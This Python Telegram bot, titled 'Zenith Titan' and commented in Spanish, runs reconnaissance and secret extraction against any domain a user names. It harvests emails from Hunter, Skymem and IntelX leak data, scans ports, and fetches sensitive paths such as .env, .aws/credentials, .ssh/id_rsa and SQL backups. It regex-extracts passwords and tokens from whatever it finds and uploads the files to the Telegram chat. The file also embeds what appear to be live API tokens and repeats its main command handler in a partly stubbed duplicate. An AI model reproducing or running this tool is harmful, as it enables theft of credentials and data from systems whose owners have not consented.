import telebot
import requests
import socket
import concurrent.futures
import io
import re
import urllib3

# Desactivar advertencias de SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURACIÓN ---
TOKEN = '8617287173:AAEqfwt8VUElbKijddKGbQmreAKSBl-ipwU'
HUNTER_API_KEY = 'TU_API_KEY_DE_HUNTER'
INTELX_API_KEY = 'dfb32516-4738-4b06-9e2c-4a6cee4cff00'
bot = telebot.TeleBot(TOKEN)

TARGET_PATHS = [
    '/.env', '/.git/config', '/backup.sql', '/db.sql', '/config.php',
    '/admin/config.php', '/settings.py', '/.aws/credentials', '/access.log',
    '/wp-config.php', '/.ssh/id_rsa', '/.bash_history', '/phpinfo.php',
    '/api/v1/users', '/storage/logs/laravel.log', '/.htaccess', '/db_backup.sql'
]

COMMON_PORTS = [21, 22, 80, 443, 3306, 5432, 8080, 27017, 6379]
def fetch_all_intelligence(domain):
    """Consulta Hunter, Skymem e IntelX en paralelo para consolidar resultados"""
    all_results = set()
    
    def from_hunter():
        url = f"https://api.hunter.io/v2/domain-search?domain={domain}&api_key={HUNTER_API_KEY}"
        try:
            r = requests.get(url, timeout=10).json()
            return [f"{e['value']} (Hunter)" for e in r['data']['emails']]
        except: return []

    def from_skymem():
        try:
            r = requests.get(f"https://www.skymem.info/srch?q={domain}", timeout=10)
            found = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', r.text)
            return [f"{e} (Skymem)" for e in found]
        except: return []

    def from_intelx():
        # Lógica simplificada para búsqueda en Phonebook/IntelX
        url = f"https://2.intelx.io/phonebook/search?k={INTELX_API_KEY}"
        try:
            # Primero se crea la tarea de búsqueda
            payload = {"term": domain, "maxresults": 50, "target": 2}
            r = requests.post(url, json=payload, timeout=10).json()
            # Se retorna confirmación de que hay datos en filtraciones
            if r.get('status') == 0: return [f"⚠️ Registros hallados en filtraciones/Leaks (IntelX)"]
        except: pass
        return []

    # Ejecución en paralelo para máxima velocidad
    with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
        futures = [executor.submit(from_hunter), executor.submit(from_skymem), executor.submit(from_intelx)]
        for f in concurrent.futures.as_completed(futures):
            all_results.update(f.result())
            
    return sorted(list(all_results))

# --- COMANDO MAESTRO ACTUALIZADO ---

@bot.message_handler(commands=['titan'])
def main_operation(message):
    args = message.text.split()
    if len(args) < 2:
        return bot.reply_to(message, "⚠️ Uso: /titan dominio.com")

    domain = args[1]
    chat_id = message.chat.id
    bot.send_message(chat_id, f"🚀 **Iniciando Auditoría Total en: {domain}**")

    # 1. OSINT MULTI-FUENTE (Hunter + Skymem + IntelX)
    bot.send_message(chat_id, "👥 Recolectando inteligencia de todas las fuentes...")
    master_list = fetch_all_intelligence(domain)
    
    if master_list:
        bot.send_message(chat_id, "✅ **Base de Datos Unificada:**\n" + "\n".join(master_list[:20]))
    else:
        bot.send_message(chat_id, "❌ No se hallaron correos públicos en ninguna fuente.")

    # 2. Infraestructura y Puertos (Tus funciones originales)
    bot.send_message(chat_id, "🌐 Mapeando infraestructura...")
    # ... (Aquí sigue find_subdomains, scan_port y audit_vulnerabilities)

    # 3. Extracción Dinámica
    bot.send_message(chat_id, "📥 Ejecutando extracción de archivos sensibles...")
    # ... (Aquí sigue extraction_engine para .env, .sql, etc.)

    bot.send_message(chat_id, "🏁 **Operación Zenith Titan Finalizada.**")


# --- NUEVAS FUNCIONES DE COMANDOS ---

def get_geo_info(domain):
    """Rastrea la ubicación física e ISP del servidor"""
    try:
        ip = socket.gethostbyname(domain)
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
        if r['status'] == 'success':
            return [
                f"📍 **País:** {r['country']} ({r['city']})",
                f"🏢 **ISP:** {r['isp']}",
                f"🌐 **IP:** {ip}"
            ]
    except: pass
    return ["❌ No se pudo obtener geolocalización."]

def google_dorks(domain):
    """Genera enlaces de búsqueda para archivos expuestos en Google"""
    queries = ['filetype:sql', 'filetype:env', 'filetype:log', 'filetype:pdf "confidencial"']
    links = []
    for q in queries:
        links.append(f"🔍 {q}: [Ver en Google](https://www.google.com/search?q=site:{domain}+{q})")
    return links

# --- MOTOR DE INTELIGENCIA (TUS FUNCIONES ORIGINALES) ---

def get_osint_data(domain):
    url = f"https://api.hunter.io/v2/domain-search?domain={domain}&api_key={HUNTER_API_KEY}"
    try:
        r = requests.get(url, timeout=10)
        data = r.json()
        return [f"📧 {e['value']} ({e['type']})" for e in data['data']['emails']]
    except: return []

def find_subdomains(domain):
    url = f"https://crt.sh/?q=%25.{domain}&output=json"
    try:
        r = requests.get(url, timeout=15)
        if r.status_code == 200:
            return sorted(list(set(entry['name_value'].lower() for entry in r.json())))
    except: return []

def scan_port(ip, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            if s.connect_ex((ip, port)) == 0: return port
    except: return None

def audit_vulnerabilities(base_url):
    vulns = []
    try:
        r = requests.get(base_url, timeout=5, verify=False)
        server = r.headers.get('Server')
        if server: vulns.append(f"ℹ️ Servidor: {server}")
        if 'X-Frame-Options' not in r.headers:
            vulns.append("⚠️ Vulnerable a Clickjacking")
        for p in ['/admin/', '/login/', '/phpmyadmin/']:
            if requests.get(f"{base_url}{p}", timeout=3, verify=False).status_code == 200:
                vulns.append(f"🚩 PANEL DETECTADO: {p}")
    except: pass
    return vulns

def extraction_engine(chat_id, url):
    headers = {'User-Agent': 'Mozilla/5.0'}
    try:
        r = requests.get(url, headers=headers, timeout=10, verify=False, allow_redirects=False)
        if r.status_code == 200 and len(r.content) > 0:
            patterns = [r'(?:user|pass|pwd|key|token|db_).*=.*', r'\"(?:password|user|email)\"\s*:\s*.*']
            matches = []
            for p in patterns:
                matches.extend(re.findall(p, r.text, re.IGNORECASE))
            info = f"💎 **Archivo Extraído:** {url.split('/')[-1]}"
            if matches:
                info += "\n\n🔑 **Credenciales Filtradas:**\n" + "\n".join(set(matches[:12]))
            file_io = io.BytesIO(r.content)
            file_io.name = f"EXTRAIDO_{url.split('/')[-1]}.txt"
            bot.send_document(chat_id, file_io, caption=info)
            return True
    except: pass
    return False

# --- NUEVOS COMANDOS INDIVIDUALES ---

@bot.message_handler(commands=['geo'])
def cmd_geo(message):
    domain = message.text.split()[1] if len(message.text.split()) > 1 else None
    if not domain: return bot.reply_to(message, "⚠️ Uso: /geo dominio.com")
    info = get_geo_info(domain)
    bot.send_message(message.chat.id, "🌍 **Ubicación del Servidor:**\n" + "\n".join(info), parse_mode="Markdown")

@bot.message_handler(commands=['dork'])
def cmd_dork(message):
    domain = message.text.split()[1] if len(message.text.split()) > 1 else None
    if not domain: return bot.reply_to(message, "⚠️ Uso: /dork dominio.com")
    links = google_dorks(domain)
    bot.send_message(message.chat.id, "📡 **Google Dorks Generados:**\n" + "\n".join(links), parse_mode="Markdown", disable_web_page_preview=True)

@bot.message_handler(commands=['headers'])
def cmd_headers(message):
    domain = message.text.split()[1] if len(message.text.split()) > 1 else None
    if not domain: return bot.reply_to(message, "⚠️ Uso: /headers dominio.com")
    try:
        r = requests.get(f"https://{domain}", timeout=5, verify=False)
        h_info = [f"🛠️ **{k}:** `{v}`" for k, v in r.headers.items() if k.lower() in ['server', 'x-powered-by', 'content-type']]
        bot.send_message(message.chat.id, "📄 **Cabeceras Técnicas:**\n" + "\n".join(h_info), parse_mode="Markdown")
    except: bot.reply_to(message, "❌ Error al conectar.")

# --- COMANDO MAESTRO (TU LÓGICA ORIGINAL) ---

@bot.message_handler(commands=['titan'])
def main_operation(message):
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ Uso: /titan dominio.com")
        return

    domain = args[1]
    chat_id = message.chat.id
    bot.send_message(chat_id, f"🚀 **Iniciando Zenith Titan Ultimate en: {domain}**")

    # 1. OSINT (Correos)
    bot.send_message(chat_id, "👥 Buscando identidades reales...")
    emails = get_osint_data(domain)
    if emails: bot.send_message(chat_id, "✅ **Correos Encontrados:**\n" + "\n".join(emails[:10]))

    # 2. Infraestructura (Subdominios)
    bot.send_message(chat_id, "🌐 Mapeando subdominios...")
    subs = find_subdomains(domain)
    if subs: bot.send_message(chat_id, "✅ **Subdominios:**\n`" + "\n".join(subs[:10]) + "`")

    # 3. Auditoría de Fallos (Vulnerabilidades)
    bot.send_message(chat_id, "🔍 Escaneando vulnerabilidades...")
    vulns = audit_vulnerabilities(f"https://{domain}")
    if vulns: bot.send_message(chat_id, "🚩 **Debilidades:**\n" + "\n".join(vulns))

    # 4. Escaneo de Puertos
    try:
        ip = socket.gethostbyname(domain)
        open_p = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(scan_port, ip, p) for p in COMMON_PORTS]
            for f in concurrent.futures.as_completed(futures):
                p = f.result()
                if p: open_p.append(str(p))
        if open_p: bot.send_message(chat_id, f"🔌 **Puertos Abiertos:** {', '.join(open_p)}")
    except: pass

    # 5. Extracción Dinámica
    bot.send_message(chat_id, "📥 Ejecutando extracción de archivos sensibles...")
    domain_clean = domain.split('.')[0]
    all_paths = TARGET_PATHS + [f"/{domain_clean}.sql", f"/{domain_clean}.zip"]
    
    for protocol in ['https://', 'http://']:
        for path in all_paths:
            extraction_engine(chat_id, f"{protocol}{domain}{path}")

    bot.send_message(chat_id, "🏁 **Operación Zenith Titan Finalizada.**")

bot.infinity_polling()
